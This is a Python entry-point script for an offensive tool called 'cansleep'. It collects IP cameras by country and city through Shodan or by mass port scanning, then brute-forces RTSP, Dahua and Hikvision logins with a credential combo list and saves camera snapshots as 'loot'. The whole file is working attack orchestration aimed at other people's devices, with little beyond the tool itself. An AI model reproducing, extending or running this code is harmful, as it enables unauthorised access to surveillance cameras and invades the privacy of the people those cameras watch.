from scanners.smap_scanner import SmapScanner
from scanners.nmap_scanner import NmapScanner
from scanners.masscan_scanner import MasscanScanner
from scanners.rustscan_scanner import RustScanScanner

from tools.checker import rtsp_checker, dahua_checker, hikka_checker
from tools.brute import rtsp_bruter, dahua_bruter, hikka_bruter
from tools.snapshot import rtsp_snapshoter, dahua_snapshoter, hikka_snapshoter

from concurrent.futures.thread import ThreadPoolExecutor
from itertools import repeat

from pathlib import Path
import argparse
import logging

import config
from tools import utils

parser = argparse.ArgumentParser(prog = 'cansleep', description = 'What the program does')
parser.add_argument('--target', required=False, type=str, help='Enter ip address or CIDR range or file')
parser.add_argument('-l', '--load', required=False, type=str, help='Load file with report.txt for skip scanning')
parser.add_argument('--country', required=False, type=str, help='Select country for search in shodan')
parser.add_argument('--city', required=False, type=str, help='Select city for search in shodan')

parser.add_argument('-s', '--scanner', required=False, default='masscan', type=str, help='Choice scanner smap,nmap,masscan')
parser.add_argument('-i', '--interface', required=False, type=str, help='Interface')
parser.add_argument('-p', '--ports', required=False, type=str, help='Ports for scanning.')

parser.add_argument('-m', '--mode', required=True, type=str, help='Attack mode all,rtsp,dahua,hikka')

parser.add_argument('--combo', required=False, default='combo.txt', type=str, help='Combo username:password')
parser.add_argument('-t', '--threads', required=False, default=10, type=int, help='Brute force threads')
parser.add_argument('-d', '--debug', required=False, action='store_true', help='Enable debug logging')

args = parser.parse_args()

if args.debug:
    level = logging.DEBUG
else:
    level = logging.INFO

logger = logging.getLogger("My_app")
logger.setLevel(level)
ch = logging.StreamHandler()
ch.setLevel(level)

ch.setFormatter(utils.CustomFormatter())
logger.addHandler(ch)

logging = logger

if not args.target and not args.load and (not args.country and not args.city):
    logging.warning('Please set target or load target from reports files')
    parser.print_help()

DEFAULT_PORTS = {
    'rtsp': [554, 8554],
    'dahua': [37777, 37778, 34567],
    'hikka': [80, 81, 8080, 8888]
}

TARGET = args.target if args.target else None
PORTS = []
if args.mode == 'rtsp' and not args.ports:
    PORTS = DEFAULT_PORTS['rtsp']
elif args.mode == 'dahua' and not args.ports:
    PORTS = DEFAULT_PORTS['dahua']
elif args.mode == 'hikka' and not args.ports:
    PORTS = DEFAULT_PORTS['hikka']
elif args.mode == 'all' and not args.ports:
    PORTS = DEFAULT_PORTS['rtsp'] + DEFAULT_PORTS['dahua'] + DEFAULT_PORTS['hikka']
else:
    PORTS = args.ports.split(',') if args.ports else None

def exec_rtsp(targets, ports, threads, rtsp_folder, loot_file, api_key):
    logging.info(f'[RTSP] Start checking routes')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        checked_targets = executor.map(
            rtsp_checker,
            targets,
            repeat(ports),
            repeat(utils.load_txt(Path('./lib/rtsp_routes.txt'), 'routes')),
            repeat(logging)
        )
    logging.info(f'[RTSP] Start brutting credentials')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        bruted_targets = executor.map(
            rtsp_bruter,
            checked_targets,
            repeat(utils.load_txt(Path('./lib/combo.txt'), 'credentials')),
            repeat(logging)
        )

    rtsp_urls = list(map(str, bruted_targets))

    logging.info(f'[RTSP] Start snapshoting cameras')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        snapshots = executor.map(
            rtsp_snapshoter,
            rtsp_urls,
            repeat(rtsp_folder),
            repeat(logging)
        )

    loot = utils.write_loot(snapshots, loot_file, proto='rtsp', api_key=api_key)
    if not loot:
        logging.warning('[RTSP] No loot. Try to change targets/ports/protocol.')

def exec_dahua(full_targets, threads, dahua_folder, loot_file, api_key):
    logging.info(f'[DAHUA] Start checking targets')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        checked_targets = executor.map(
            dahua_checker,
            full_targets,
            repeat(logging)
        )

    logging.info(f'[DAHUA] Start brutting credentials')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        bruted_targets = executor.map(
            dahua_bruter,
            checked_targets,
            repeat(utils.load_txt(Path('./lib/combo.txt'), 'credentials')),
            repeat(logging)
        )

    logging.info(f'[DAHUA] Start snapshoting')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        snapshots = executor.map(
            dahua_snapshoter,
            bruted_targets,
            repeat(dahua_folder),
            repeat(logging)
        )

    loot = utils.write_loot(snapshots, loot_file, proto='dahua', api_key=api_key)
    if not loot:
        logging.warning('[DAHUA] No loot. Try to change targets/ports/protocol.')

def exec_hikka(full_targets, threads, hikka_folder, loot_file, api_key):
    logging.info(f'[HIKKA] Start checking connection')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        checked_targets = executor.map(
            hikka_checker,
            full_targets,
            repeat(logging)
        )

    logging.info(f'[HIKKA] Start brutting credentials')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        bruted_targets = executor.map(
            hikka_bruter,
            checked_targets,
            repeat(utils.load_txt(Path('./lib/combo.txt'), 'credentials')),
            repeat(logging)
        )

    logging.info(f'[HIKKA] Start snapshoting')
    with ThreadPoolExecutor(max_workers=threads) as executor:
        snapshots = executor.map(
            hikka_snapshoter,
            bruted_targets,
            repeat(hikka_folder),
            repeat(logging)
        )

    loot = utils.write_loot(snapshots, loot_file, proto='dahua', api_key=api_key)
    if not loot:
        logging.warning('[HIKKA] No loot. Try to change targets/ports/protocol.')

API_KEY = None if config.SHODAN_API_KEY == '' else config.SHODAN_API_KEY

attack_folder = Path(f'./reports/{utils.dtfilename()}')
report_file = Path(f'{attack_folder}/report.txt')
loot_file = Path(f'{attack_folder}/loot.txt')
snapshots_folder = Path(f'{attack_folder}/snapshots/')
dahua_folder = Path(f'{snapshots_folder}/dahua/')
rtsp_folder = Path(f'{snapshots_folder}/rtsp/')
hikka_folder = Path(f'{snapshots_folder}/hikka/')
shodan_file = Path(f'{attack_folder}/shodan.txt')

utils.create_folder(attack_folder)
utils.create_file(report_file)
utils.create_file(loot_file)
utils.create_folder(snapshots_folder)

utils.create_folder(dahua_folder)
utils.create_folder(rtsp_folder)
utils.create_folder(hikka_folder)

if TARGET == None and args.country and args.city:
    logging.info(f'[SHODAN] Gatherings info for {args.country} {args.city}')
    if args.ports:
        utils.search_shodan(args.country, shodan_file, API_KEY, logging, city=args.city, mode=args.mode, port=args.ports)
    else:
        utils.search_shodan(args.country, shodan_file, API_KEY, logging, city=args.city, mode=args.mode)
    TARGET = str(shodan_file)

if TARGET != None or args.load:
    report = None
    targets = []
    full_targets = []
    ports = []

    if not args.load:
        match args.scanner:
            case 'smap':
                logging.info('[SMAP] Start scanning. Please wait...')
                smap = SmapScanner(TARGET, is_file=utils.target_is_file(TARGET), ports=PORTS, logging=logging)
                report = smap.scan()
            case 'nmap':
                logging.info('[NMAP] Start scanning. Please wait...')
                nmap = NmapScanner(TARGET, is_file=utils.target_is_file(TARGET), ports=PORTS, logging=logging)
                report = nmap.scan()
            case 'masscan':
                logging.info('[MASSCAN] Start scanning. Please wait...')
                mass = MasscanScanner(TARGET, is_file=utils.target_is_file(TARGET), ports=PORTS, interface=args.interface, logging=logging)
                report = mass.scan()
            case 'rustscan':
                logging.info('[RUSTSCAN] Start scanning. Please wait...')
                rust = RustScanScanner(TARGET, is_file=utils.target_is_file(TARGET), ports=PORTS, logging=logging)
                report = rust.scan()
    else:
        report = utils.load_from_report(args.load)

    if report and not args.load:
        for line in report.split('\n'):
            if line != '': targets.append(line.split(':')[0])
            if line != '': ports.append(int(line.split(':')[1]))
            if line != '': full_targets.append(line)
    else:
        for line in report:
            if line != '': targets.append(line.split(':')[0])
            if line != '': ports.append(int(line.split(':')[1]))
            if line != '': full_targets.append(line)

    with open(report_file, 'w') as file:
        file.write('\n'.join(full_targets))

    match args.mode:
        case 'all':
            exec_dahua(full_targets, args.threads, dahua_folder, loot_file, API_KEY)
            exec_hikka(full_targets, args.threads, hikka_folder, loot_file, API_KEY)
            exec_rtsp(targets, PORTS, args.threads, rtsp_folder, loot_file, API_KEY)
        case 'rtsp':
            exec_rtsp(targets, PORTS, args.threads, rtsp_folder, loot_file, API_KEY)
        case 'dahua':
            exec_dahua(full_targets, args.threads, dahua_folder, loot_file, API_KEY)
        case 'hikka':
            exec_hikka(full_targets, args.threads, hikka_folder, loot_file, API_KEY)
        case 'http':
            pass
